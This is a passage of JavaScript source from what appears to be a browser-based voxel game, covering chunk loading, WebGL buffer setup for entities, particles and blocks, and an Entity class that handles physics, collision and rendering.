			this.solidTops = data.solidTops
			this.biomes = data.biomes
			this.caveY = data.caveY
			this.caveBiomes = data.caveBiomes

			this.loaded = true
			//this.lit = true
			/*//Update neighbour chunks
			let otherChunk = this.world.getChunk(this.x,this.z+16,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeZNeg()
			}
			otherChunk = this.world.getChunk(this.x,this.z-16,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeZPos()
			}
			otherChunk = this.world.getChunk(this.x+16,this.z,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeXNeg()
			}
			otherChunk = this.world.getChunk(this.x-16,this.z,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeXPos()
			}*/
		}
		loadCopy(){
			let serverChunk = serverWorld[this.type].getChunk(this.x,this.z)
			if(!serverChunk) return
			let importants = []
			for(let s = 0; s < serverChunk.sections.length; s++){
				this.sections[s] = new Section(this.x, s*16+minHeight, this.z, this)
				if(serverChunk.sections[s].blocks){
					this.sections[s].blocks.set(serverChunk.sections[s].blocks)
					const {blocks} = this.sections[s]
					for(let i=0; i<blocks.length; i++){
						let b = blocks[i]
						if(blockData[b].semiTrans){
							this.doubleRender = true
						}
						if(blockData[b].importantOnset){
							importants.push(i,b)
						}
					}
					for(let i=0; i<importants.length; i+=2){
						let idx = importants[i]
						blockData[importants[i+1]].importantOnset(this.x+((idx>>8)&15),this.sections[s].y+((idx>>4)&15),this.z+(idx&15), this.type,this.world)
					}
					importants.length = 0
				}
				let tagss = serverChunk.sections[s].tags
				for(let i in tagss){
					if(typeof tagss[i] === "number") this.sections[s].tags[i] = tagss[i]
					else if(tagss[i]) this.sections[s].tags[i] = JSON.parse(JSON.stringify(tagss[i]))
				}
			}
			if(this.doubleRender){
				if (!this.world.doubleRenderChunks.includes(this)) {
          this.world.doubleRenderChunks.push(this)
        }
			}
			
			this.tops = new Int16Array(serverChunk.tops)
			this.solidTops = new Int16Array(serverChunk.solidTops)
			this.biomes = new Uint8Array(serverChunk.biomes)
			this.caveY = new Int16Array(serverChunk.caveY)
			this.caveBiomes = new Uint8Array(serverChunk.caveBiomes)

			this.loaded = true
			//this.lit = true
			/*//Update neighbour chunks
			let otherChunk = this.world.getChunk(this.x,this.z+16,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeZNeg()
			}
			otherChunk = this.world.getChunk(this.x,this.z-16,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeZPos()
			}
			otherChunk = this.world.getChunk(this.x+16,this.z,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeXNeg()
			}
			otherChunk = this.world.getChunk(this.x-16,this.z,this.type)
			if(otherChunk && otherChunk.optimized){
				otherChunk.reoptimizeXPos()
			}*/
		}
		loadCopyLight(){
			let serverChunk = serverWorld[this.type].getChunk(this.x,this.z)
			let importants = []
			for(let s = 0; s < serverChunk.sections.length; s++){
				if(!this.sections[s]) this.sections[s] = new Section(this.x, s*16+minHeight, this.z, this)
				this.sections[s].skyLight.set((serverChunk.sections[s] || emptySection).skyLight)
				this.sections[s].blockLight.set((serverChunk.sections[s] || emptySection).blockLight)
			}
		}
		requireSection(i){
			if (!this.sections[i]) {
				do {
          let section = new Section(this.x, this.sections.length * 16 + minHeight, this.z, this)
					this.sections.push(section)
				} while (!this.sections[i])
			}
			return this.sections[i]
		}
		customLoadStart(){
			this.tops = new Int16Array(256)
			this.solidTops = new Int16Array(256)
			this.biomes = new Uint8Array(256)
			this.caveY = new Int16Array(512)
			this.caveBiomes = new Uint8Array(256)
		}
		customLoadEnd(){
			let maxY = this.sections.length*16 - minHeight + 15
			for(let x=0; x<16; x++) for(let z=0; z<16; z++){
				this.updateSolidTop(x,maxY,z,0)
			}
			if(this.doubleRender){
				if (!this.world.doubleRenderChunks.includes(this)) {
          this.world.doubleRenderChunks.push(this)
        }
			}
			this.loaded = true
		}
	}

  /*let entPlayerCollided
  let collidedWithMe
  function entCollided(ent){
    var w2 = ent.width/2, h2 = ent.height/2, d2 = ent.depth/2
    entPlayerCollided = false
    collidedWithMe = false
		ent.world.getEntitiesNear(ent.x,ent.y,ent.z,ent.dimension, 2, nearEntityArray)
    for(var e of nearEntityArray){
      if(e === ent || e.dimension !== ent.dimension) continue
      var ew2 = e.width/2, eh2 = e.height/2, ed2 = e.depth/2
      if(ent.x - w2 < e.x + ew2 &&
       ent.x + w2 > e.x - ew2 &&
       ent.y - h2 < e.y + eh2 &&
       ent.y - h2 > e.y - eh2 &&
       ent.z - d2 < e.z + ed2 &&
       ent.z + d2 > e.z - ed2) return e
    }
		for(var i in players){
			let e = players[i]
			if(e === ent || e.dimension !== ent.dimension || e.hidden || e.die) continue
			if(ent.x - w2 <= e.x + e.width*0.5 &&
					ent.x + w2 >= e.x - e.width*0.5 &&
					ent.y - h2 <= e.y + e.height*0.5 &&
					ent.y - h2 >= e.y - e.height*0.5 &&
					ent.z - d2 <= e.z + e.depth*0.5 &&
					ent.z + d2 >= e.z - e.depth*0.5){
				entPlayerCollided = true
				return e
			}
		}
    if(!p.spectator && p.dimension === ent.dimension && !p.die &&
       ent.x - w2 <= p.x + p.width*0.5 &&
       ent.x + w2 >= p.x - p.width*0.5 &&
       ent.y - h2 <= p.y + p.height*0.5 &&
       ent.y - h2 >= p.y - p.height*0.5 &&
       ent.z - d2 <= p.z + p.depth*0.5 &&
       ent.z + d2 >= p.z - p.depth*0.5) collidedWithMe = true
  }*/
  function getEntityOrPlayer(id){
    if(id === p.id) return p
		return players[id] || world.entities.get(id)
    /*for(let i in players){
      if(players[i].id === id) return players[i]
    }
		world.getEntitiesNear(p.x,p.y,p.z,p.dimension, settings.renderDistance*16, nearEntityArray)
    for(let i=0; i<nearEntityArray.length; i++){
      if(nearEntityArray[i].id === id){
        return nearEntityArray[i]
      }
    }*/
  }
  
	class Contacts {
		constructor() {
			this.array = []
			this.size = 0
		}
		add(x, y, z, block, data) {
			if (this.size === this.array.length) {
				this.array.push([ x, y, z, block, data ])
			} else {
				this.array[this.size][0] = x
				this.array[this.size][1] = y
				this.array[this.size][2] = z
				this.array[this.size][3] = block
				this.array[this.size][4] = data
			}
			this.size++
		}
		clear() {
			this.size = 0
		}
	}
  
  var entityMatrices = {
    modelViewProjectionMatrix: new Matrix(),
    projectionMatrix: new Matrix(),
    modelMatrix: new Matrix()
  }
  
  function generateVAO(shape, textureX, textureY, textureW, textureH, cached){
    const shapeVerts = shape.verts
    const shapeTexVerts = shape.texVerts
    const size = shape.size
    const shapeNormal = shape.normal
		let blockSides = Object.keys(Block)
		let texNum = 0
		let texture = []
		let index = 0
		let normal = []
		for (let n = 0; n < 6; n++) {
			let side = blockSides[n]
			let directionalFaces = shapeVerts[n]
			for (let facei = 0; facei < directionalFaces.length; facei++) {
				let texShapeVerts = shapeTexVerts[n][facei]
				let tx = textureX, ty = textureY, tw = textureW, th = textureH
				if(texShapeVerts.texture){
					let texVerts = textureCoords[textureMap[texShapeVerts.texture]]
					tx = texVerts[0]
					ty = texVerts[1]
					tw = texVerts[2]-tx
					th = texVerts[5]-ty
				}
				texture[index    ] = tx + texShapeVerts[0]*tw
				texture[index + 1] = ty + texShapeVerts[1]*th
				texture[index + 2] = tx + texShapeVerts[2]*tw
				texture[index + 3] = ty + texShapeVerts[3]*th
				texture[index + 4] = tx + texShapeVerts[4]*tw
				texture[index + 5] = ty + texShapeVerts[5]*th
				texture[index + 6] = tx + texShapeVerts[6]*tw
				texture[index + 7] = ty + texShapeVerts[7]*th
				index += 8
				normal.push(...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei])
			}
			texNum++
		}
		const vao = glExtensions.vertex_array_object.createVertexArrayOES()
		const verticesBuffer = gl.createBuffer()
		const textureBuffer = gl.createBuffer()
		const normalBuffer = gl.createBuffer()
		if(!cached){
			vao.tHeVerticesBuffer = verticesBuffer
			vao.tHeTextureBuffer = textureBuffer
			vao.tHeNormalBuffer = normalBuffer
		}
		glExtensions.vertex_array_object.bindVertexArrayOES(vao)
		gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

		gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aVertexEntity, 3, gl.FLOAT, false, 0, 0)

		gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aTextureEntity, 2, gl.FLOAT, false, 0, 0)

		gl.bindBuffer(gl.ARRAY_BUFFER, normalBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(normal), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aNormalEntity, 3, gl.FLOAT, false, 0, 0)

		gl.enableVertexAttribArray(glCache.aVertexEntity)
		gl.enableVertexAttribArray(glCache.aTextureEntity)
		gl.enableVertexAttribArray(glCache.aNormalEntity)
    glExtensions.vertex_array_object.bindVertexArrayOES(null)
    return {vao, size}
  }
	function generatParticleVAO(shape, textureX, textureY, textureW, textureH, cached){
    const shapeVerts = shape.verts
    const shapeTexVerts = shape.texVerts
    const size = shape.size
		let blockSides = Object.keys(Block)
		let texNum = 0
		let texture = []
		let index = 0
		let normal = []
		for (let n = 0; n < 6; n++) {
			let side = blockSides[n]
			let directionalFaces = shapeVerts[n]
			for (let facei = 0; facei < directionalFaces.length; facei++) {
				//let originalShapeVerts = shape.originalVerts[n][facei]//todo n
				let tx = textureX, ty = textureY, tw = textureW, th = textureH
				/*if(originalShapeVerts && originalShapeVerts.t && textureMap[originalShapeVerts.t]){
					let texVerts = textureCoords[textureMap[originalShapeVerts.t]]
					tx = texVerts[0]
					ty = texVerts[1]
					tw = texVerts[2]-tx
					th = texVerts[5]-ty
				}*/
				let texShapeVerts = shapeTexVerts[n][facei]
				texture[index    ] = tx + texShapeVerts[0]*tw
				texture[index + 1] = ty + texShapeVerts[1]*th
				texture[index + 2] = tx + texShapeVerts[2]*tw
				texture[index + 3] = ty + texShapeVerts[3]*th
				texture[index + 4] = tx + texShapeVerts[4]*tw
				texture[index + 5] = ty + texShapeVerts[5]*th
				texture[index + 6] = tx + texShapeVerts[6]*tw
				texture[index + 7] = ty + texShapeVerts[7]*th
				index += 8
			}
			texNum++
		}
		const vao = glExtensions.vertex_array_object.createVertexArrayOES()
		const verticesBuffer = gl.createBuffer()
		const textureBuffer = gl.createBuffer()
		if(!cached){
			vao.tHeVerticesBuffer = verticesBuffer
			vao.tHeTextureBuffer = textureBuffer
		}
		glExtensions.vertex_array_object.bindVertexArrayOES(vao)
		gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

		gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aVertexParticle, 3, gl.FLOAT, false, 0, 0)

		gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aTextureParticle, 2, gl.FLOAT, false, 0, 0)

		gl.enableVertexAttribArray(glCache.aVertexParticle)
		gl.enableVertexAttribArray(glCache.aTextureParticle)
    glExtensions.vertex_array_object.bindVertexArrayOES(null)
    return {vao, size}
  }
	function generateBlockVAO(blockID,replaceTextures){
		const block = blockData[blockID]
		const tex = block.textures
		const shape = block.shape
		const shapeVerts = shape.verts
		const shapeTexVerts = shape.texVerts
		const size = shape.size
		const shapeNormal = shape.normal
		let blockSides = Object.keys(Block)
		let texNum = 0
		let texture = []
		let index = 0
		let normal = []
		for (let n = 0; n < 6; n++) {
			let side = blockSides[n]
			let directionalFaces = shapeVerts[n]
			for (let facei = 0; facei < directionalFaces.length; facei++) {
				let texShapeVerts = shapeTexVerts[n][facei]
				let texVerts
				if(texShapeVerts.texture){
					if(replaceTextures && replaceTextures[texShapeVerts.texture]) texVerts = textureCoords[textureMap[replaceTextures[texShapeVerts.texture]]]
					else texVerts = textureCoords[textureMap[texShapeVerts.texture]]
				}else texVerts = textureCoords[tex && textureMap[tex[texNum]] || textureMap.error]
				let tx = texVerts[0]
				let ty = texVerts[1]
				let tw = texVerts[2]-tx
				let th = texVerts[5]-ty
				texture[index    ] = tx + texShapeVerts[0]*tw
				texture[index + 1] = ty + texShapeVerts[1]*th
				texture[index + 2] = tx + texShapeVerts[2]*tw
				texture[index + 3] = ty + texShapeVerts[3]*th
				texture[index + 4] = tx + texShapeVerts[4]*tw
				texture[index + 5] = ty + texShapeVerts[5]*th
				texture[index + 6] = tx + texShapeVerts[6]*tw
				texture[index + 7] = ty + texShapeVerts[7]*th
				index += 8
				normal.push(...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei])
			}
			texNum++
		}
		var vao = glExtensions.vertex_array_object.createVertexArrayOES()
		const verticesBuffer = gl.createBuffer()
		const textureBuffer = gl.createBuffer()
		const normalBuffer = gl.createBuffer()
		glExtensions.vertex_array_object.bindVertexArrayOES(vao)
		gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

		gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aVertexEntity, 3, gl.FLOAT, false, 0, 0)

		gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aTextureEntity, 2, gl.FLOAT, false, 0, 0)

		gl.bindBuffer(gl.ARRAY_BUFFER, normalBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(normal), gl.STATIC_DRAW)
		gl.vertexAttribPointer(glCache.aNormalEntity, 3, gl.FLOAT, false, 0, 0)

		gl.enableVertexAttribArray(glCache.aVertexEntity)
		gl.enableVertexAttribArray(glCache.aTextureEntity)
		gl.enableVertexAttribArray(glCache.aNormalEntity)
		glExtensions.vertex_array_object.bindVertexArrayOES(null)
		return {vao, size}
	}

	let entities = []
	let {serverEntities} = win
	class Entity {
		constructor(x, y, z, pitch, yaw, velx, vely, velz, width, height, depth, vertices, texture, faces, despawns, vao, dimension) {
			this.x = x
			this.y = y
			this.z = z
			this.previousX = x
			this.previousY = y
			this.previousZ = z
			this.canStepX = true
			this.canStepY = true
			this.pitch = pitch
			this.yaw = yaw
			this.roll = 0
			this.pitch2 = 0
      this.previousPitch = pitch
      this.previousYaw = yaw
			this.previousRoll = 0
			this.previousPitch2 = 0
			this.velx = velx
			this.vely = vely
			this.velz = velz
			this.width = width
			this.height = height
			this.depth = depth
      this.offsetY = 0
      this.prevOffsetY = 0
      this.extraSize = 0
      this.hidden = false
      this.harmEffect = 0
			this.contacts = new Contacts()
			this.lastUpdate = performance.now()
			this.onGround = false
      this.hasCollided = false
      this.gravityStength = -0.091
      this.standingOn = 0
      this.insideBlock = 0
			this.despawns = despawns
			this.spawn = this.lastUpdate
			this.canDespawn = false
      this.dieEffect = 0
      this.dieRotate = 0
      this.burning = false
      this.liquid = false
      this.prevLiquid = false
      this.wet = false
      this.parts = {}
			this.faces = faces
      this.shader = 0
			this.world = world //also set in addEntity
			this.chunkX = x >> 4
			this.chunkZ = z >> 4
			this.chunkDimension = ""
			this.glow = false
			this.canRide = false
			this.lastPos = performance.now()
			this.hitboxWidth = this.hitboxWidth || max(this.width,this.depth)//unused
			this.hitboxHeight = this.hitboxHeight || this.height
			this.rideOffsetX = 0
			this.rideOffsetY = this.hitboxHeight/2
			this.rideOffsetZ = 0
			this.offsetry = 0
      if(vao){
        this.vao = vao
				if(vao.tHeVerticesBuffer){
					this.verticesBuffer = vao.tHeVerticesBuffer
					this.textureBuffer = vao.tHeTextureBuffer
					this.normalBuffer = vao.tHeNormalBuffer
				}
      }else if(vertices && texture){
        this.vao = glExtensions.vertex_array_object.createVertexArrayOES()
        const verticesBuffer = this.verticesBuffer = gl.createBuffer()
        const textureBuffer = this.textureBuffer = gl.createBuffer()
        glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
        gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

        gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aVertexEntity, 3, gl.FLOAT, false, 0, 0)

        gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
        gl.bufferData(gl.ARRAY_BUFFER, texture, gl.STATIC_DRAW)
        gl.vertexAttribPointer(glCache.aTextureEntity, 2, gl.FLOAT, false, 0, 0)

        gl.enableVertexAttribArray(glCache.aVertexEntity)
        gl.enableVertexAttribArray(glCache.aTextureEntity)
        glExtensions.vertex_array_object.bindVertexArrayOES(null)
      }
      this.dimension = dimension
			this.targetX = x
			this.targetY = y
			this.targetZ = z
			this.doInterpolate = false
		}
		updateVelocity(now) {
      this.standingOn = this.world.getBlock(round(this.x), floor(this.y-this.height/2), round(this.z), this.dimension)
      this.insideBlock = this.world.getBlock(round(this.x),round(this.y),round(this.z), this.dimension)
      if(this.prevLiquid !== this.liquid){
        this.prevLiquid = this.liquid
      }
			if(!this.doInterpolate){
				this.vely += this.gravityStength
				let drag = this.liquid && !this.canFloat ? 0.7 : (this.onGround ? 0.8 : 0.9)
				if(blockData[this.standingOn].slide) drag = blockData[this.standingOn].slide
				this.velz += (this.velz * drag - this.velz)
				this.velx += (this.velx * drag - this.velx)
				this.vely += (this.vely * drag - this.vely)
			}
		}
		collided(x, y, z, vx, vy, vz, block) {
			let verts = blockData[block].shape.verts
			let px = this.x - this.width / 2 - x
			let py = this.y - this.height / 2 - y
			let pz = this.z - this.depth / 2 - z
			let pxx = this.x + this.width / 2 - x
			let pyy = this.y + this.height / 2 - y
			let pzz = this.z + this.depth / 2 - z
			let minX, minY, minZ, maxX, maxY, maxZ, min, max
    	let stuckInBlock = this.mob && this.insideBlock && blockData[this.insideBlock].solid

			//Top and bottom faces
			let faces = verts[0]
			if (vy <= 0) {
				faces = verts[1]
			}
			if (vx === null && vz === null) {
        let col = false
				for (let face of faces) {
					min = face.min
					minX = min[0]
					minZ = min[2]
					max = face.max
					maxX = max[0]
					maxZ = max[2]
					if (face[1] > py && face[1] < pyy && minX < pxx && maxX > px && minZ < pzz && maxZ > pz) {
            col = true
						if (vy <= 0) {
							this.onGround = true
							if(!stuckInBlock) this.y = face[1] + y + this.height / 2; else this.y = this.previousY
							this.vely = 0
						} else {
							if(!stuckInBlock) this.y = face[1] + y - this.height / 2; else this.y = this.previousY
              this.vely = 0
						}
					}
				}
				return col
			}

			//West and East faces
			if (vx < 0) {
				faces = verts[4]
			} else if (vx > 0) {
				faces = verts[5]
			}
			if (vx !== null) {
				let col = false
				for (let face of faces) {
					min = face.min
					minZ = min[2]
					minY = min[1]
					max = face.max
					maxZ = max[2]
					maxY = max[1]
					if (face[0] > px && face[0] < pxx && minY < pyy && maxY > py && minZ < pzz && maxZ > pz) {
						if (maxY - py > 0.5) {
							this.canStepX = false
							if(!stuckInBlock) this.x = x + face[0] + (vx < 0 ? this.width / 2 : -this.width / 2); else this.y = this.previousX
              this.velx = 0
						}
						col = true
					}
				}
				return col
			}

			//South and North faces
			if (vz < 0) {
				faces = verts[2]
			} else if (vz > 0) {
				faces = verts[3]
			}
			if (vz !== null) {
				let col = false
				for (let face of faces) {
					min = face.min
					minX = min[0]
					minY = min[1]
					max = face.max
					maxX = max[0]
					maxY = max[1]
					if (face[2] > pz && face[2] < pzz && minY < pyy && maxY > py && minX < pxx && maxX > px) {
						if (maxY - py > 0.5) {
							this.canStepZ = false
							if(!stuckInBlock) this.z = z + face[2] + (vz < 0 ? this.depth / 2 : -this.depth / 2); else this.y = this.previousY
              this.velz = 0
						}
						col = true
					}
				}
				return col
			}
		}
		move(now) {
      let steps = Math.ceil(max(abs(this.velx / (this.width/2)), abs(this.vely / (this.height/2)), abs(this.velz / (this.depth/2)), 1))
      const VX = this.velx / steps
      const VY = this.vely / steps
      const VZ = this.velz / steps
      
			let pminX = floor(this.x - this.width / 2)
			let pmaxX = ceil(this.x + this.width / 2)
			let pminY = floor(this.y - this.height / 2)
			let pmaxY = ceil(this.y + this.height / 2)
			let pminZ = floor(this.z - this.depth / 2)
			let pmaxZ = ceil(this.z + this.depth / 2)
			let block = null

      this.liquid = this.wet = false
			for (let x = pminX; x <= pmaxX; x++) {
				for (let y = pminY; y <= pmaxY; y++) {
					for (let z = pminZ; z <= pmaxZ; z++) {
						let block = this.world.getBlock(x, y, z, this.dimension)
						if (block && blockData[block].solid) {
							this.contacts.add(x, y, z, block)
						}
            if(x === round(this.x) && z === round(this.z) && blockData[block].liquid){
              this.liquid = true
              if(this.canFloat && x === round(this.x) && z === round(this.z) && y === round(this.y)){
                this.vely+=1/4
              }
              if(blockData[block].wet) this.wet = true
            }
            if(blockData[block].getCurrent){
              var me = blockData[block]
              var c = me.getCurrent(x,y,z,undefined,undefined,this.world)
              this.velx += (c.x||0)/64
              this.velz += (c.z||0)/64
              var under = this.world.getBlock(x,y-1,z,this.dimension)
              if(me.isThis(under) && under !== me.id) this.vely -= 1/128
            }
					}
				}
			}
			this.world.getEntitiesNear(this.x,this.y,this.z,this.dimension, ceil(max(this.width/2,this.height/2,this.depth/2)), nearEntityArray)
      for(let i = 0; i < nearEntityArray.length; i++) {
        var e = nearEntityArray[i]
        if(e.canStandOn && e.block && e.x > pminX && e.x < pmaxX && e.y > pminY && e.y < pmaxY && e.z > pminZ && e.z < pmaxZ) {
          this.contacts.add(e.x, e.y, e.z, e.block, e)
        }
      }
			if(weather === "rain" && weatherAmount > 0.5){
				let top = world.getSolidTop(round(this.x),round(this.z),this.dimension)
				if(this.y > top) this.wet = true
			}

			
			this.previousX = this.x
			this.previousY = this.y
			this.previousZ = this.z
			this.previousPitch = this.pitch
			this.previousYaw = this.yaw
			this.previousRoll = this.roll
			this.previousPitch2 = this.pitch2
			this.prevOffsetY = this.offsetY
			this.hasCollided = false
			for(let part in this.parts){
				this.parts[part].prx = this.parts[part].rx
				this.parts[part].pry = this.parts[part].ry
				this.parts[part].prz = this.parts[part].rz
				this.parts[part].pry2 = this.parts[part].ry2
			}
			if(!this.doInterpolate){
				let maxpushX = 0, minpushX = 0, maxpushY = 0, minpushY = 0, maxpushZ = 0, minpushZ = 0
				for (let j = 1; j <= steps; j++) {
					let px = this.x, pz = this.z, py = this.y
					
					this.canStepX = false
					this.canStepY = false
					this.onGround = false
					//Check collisions in the Y direction
					this.y += VY
					for (let i = 0; i < this.contacts.size; i++) {
						block = this.contacts.array[i]
						let x = block[0], y = block[1], z = block[2], vy = VY, thispush = 0
						if(block[4]){
							x = block[4].previousX
							z = block[4].previousZ
							vy -= (block[4].y-block[4].previousY)/steps
							y = lerp(j/steps,block[4].previousY,y)
							thispush = block[4].vely
						}
						if (this.collided(x, y, z, null, vy, null, block[3])) {
							this.hasCollided = true
							if(blockData[block[3]].bounciness){
								thispush -= (VY*steps-thispush)*blockData[block[3]].bounciness
							}
							maxpushY = max(maxpushY,thispush)
							minpushY = min(minpushY,thispush)
							//break
						}
					}

					if (this.onGround) {
						this.canStepX = true
						this.canStepZ = true
					}

					//Check collisions in the X direction
					this.x += VX
					for (let i = 0; i < this.contacts.size; i++) {
						block = this.contacts.array[i]
						let x = block[0], y = block[1], z = block[2], vx = VX, thispush = 0
						if(block[4]){
							z = block[4].previousZ
							vx -= (block[4].x-block[4].previousX)/steps
							x = lerp(j/steps,block[4].previousX,x)
							thispush = block[4].velx
						}
						if (this.collided(x, y, z, vx, null, null, block[3])) {
							if (this.canStepX && !this.world.getBlock(block[0], block[1] + 1, block[2], this.dimension) && !this.world.getBlock(block[0], block[1] + 2, block[2]), this.dimension) {
								continue
							}
							this.hasCollided = true
							if(blockData[block[3]].bounciness){
								thispush -= (VX*steps-thispush)*blockData[block[3]].bounciness
							}
							maxpushX = max(maxpushX,thispush)
							minpushX = min(minpushX,thispush)
							//break
						}
					}

					//Check collisions in the Z direction
					this.z += VZ
					for (let i = 0; i < this.contacts.size; i++) {
						block = this.contacts.array[i]
						let x = block[0], y = block[1], z = block[2], vz = VZ, thispush = 0
						if(block[4]){
							vz -= (block[4].z-block[4].previousZ)/steps
							z = lerp(j/steps,block[4].previousZ,z)
							thispush = block[4].velz
						}
						if (this.collided(x, y, z, null, null, vz, block[3])) {
							if (this.canStepZ && !this.world.getBlock(block[0], block[1] + 1, block[2], this.dimension) && !this.world.getBlock(block[0], block[1] + 2, block[2], this.dimension)) {
								continue
							}
							this.hasCollided = true
							if(blockData[block[3]].bounciness){
								thispush -= (VZ*steps-thispush)*blockData[block[3]].bounciness
							}
							maxpushZ = max(maxpushZ,thispush)
							minpushZ = min(minpushZ,thispush)
							//break
						}
					}
				}
				
				this.contacts.clear()
				if(this.onGround){
					this.hasCollided = true
				}
				if(maxpushY || minpushY){
					if("lastY" in this) this.lastY = p.y
					this.vely += maxpushY+minpushY
					this.onGround = false
				}
				if(maxpushX || minpushX){
					this.velx += maxpushX+minpushX
				}
				if(maxpushZ || minpushZ){
					this.velz += maxpushZ+minpushZ
				}
			}else{
				let diff = (now - this.lastPos) / tickTime
				if(diff > 10) diff = 10
				this.x = this.targetX+this.velx*diff
				this.y = this.targetY+this.vely*diff
				this.z = this.targetZ+this.velz*diff
			}
			this.updateChunk()
			this.lastUpdate = now
		}
		updateChunk(){
			let chunkX = this.x >> 4, chunkZ = this.z >> 4
			if(this.chunkX !== chunkX || this.chunkZ !== chunkZ || this.dimension !== this.chunkDimension){
				let oldChunk = this.world.getChunk(this.chunkX<<4,this.chunkZ<<4,this.chunkDimension)
				let chunk = this.world.getChunk(chunkX<<4,chunkZ<<4,this.dimension)
				this.chunkX = chunkX
				this.chunkZ = chunkZ
				this.chunkDimension = this.dimension
				if(oldChunk && oldChunk.entities[this.id]) delete oldChunk.entities[this.id]
				if(chunk) chunk.entities[this.id] = this
			}
		}
    moveTowards(x,y,z, rw, rh, rd, slowDown = 1, gravity){
      var dist = dist3(this.x/rw,this.y/rh,this.z/rd,x/rw,y/rh,z/rd)
      var aDist = abs(dist)
      if(aDist > 1) return
      var iDist = 1 - aDist //inverted distance
      var velx = x-this.x
      var vely = y-this.y
      var velz = z-this.z
      var mag = sqrt(velx * velx + vely * vely + velz * velz)
      this.velx += velx*iDist/mag/slowDown
      if(!gravity) this.vely = vely*iDist/mag/slowDown
			else if(this.onGround) this.vely += vely*iDist/mag/slowDown*20
      this.velz += velz*iDist/mag/slowDown
      
      /*var toX = lerp(iDist, this.x, x)
      var toY = lerp(iDist, this.y, y)
      var toZ = lerp(iDist, this.z, z)
      this.velx = (toX - this.x) / slowDown * iDist
      if(this.onGround) this.vely = (toY - this.y) / slowDown * iDist
      this.velz = (toZ - this.z) / slowDown * iDist*/

      /*var xd = this.x - p.x, zd = this.z - p.z;
      var x = xd; this.velx = (x-(Math.sign(x)*7.25)) / 150
      if(this.onGround) {var y = this.y - (p.y-p.bottomH); this.vely = (y-(Math.sign(y)*7.25)) / 40}
      var z = zd; this.velz = (z-(Math.sign(z)*7.25)) / 150*/
    }
		setPos(x,y,z,vx,vy,vz){
			this.velx = vx
			this.vely = vy
			this.velz = vz
			if(this.doInterpolate){
				this.targetX = x
				this.targetY = y
				this.targetZ = z
				this.lastPos = performance.now()
			}else{
				this.x = x
				this.y = y
				this.z = z
			}
		}
		update() {
			this.updateVelocity(now)
			this.move(now)
		}
		render() {
      totalEntites++
      if(this.hidden || !p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = lerp(diff,this.prevOffsetY,this.offsetY)
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
			
			let prevYaw = this.previousYaw
			if(this.yaw - prevYaw > Math.PI) prevYaw += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
			if(this.yaw - prevYaw < -Math.PI) prevYaw -= Math.PId
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotX(lerp(diff,this.previousPitch,this.pitch))
			modelMatrix.rotY(lerp(diff,prevYaw,this.yaw)+this.offsetry)
			if(this.pitch2 || this.previousPitch2) modelMatrix.rotX(lerp(diff,this.previousPitch2,this.pitch2))
			if(this.roll || this.previousRoll) modelMatrix.rotZ(lerp(diff,this.previousRoll,this.roll))
			if(this.dieRotate){
				modelMatrix.translate(0,-this.height/2,0)
				modelMatrix.rotZ(this.dieRotate)
				modelMatrix.translate(0,this.height/2,0)
			}
			if(this.noScale) modelMatrix.scale(1 + this.extraSize, 1 + this.extraSize, 1 + this.extraSize)
      else modelMatrix.scale(this.width + this.extraSize, this.height + this.extraSize, this.depth + this.extraSize)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
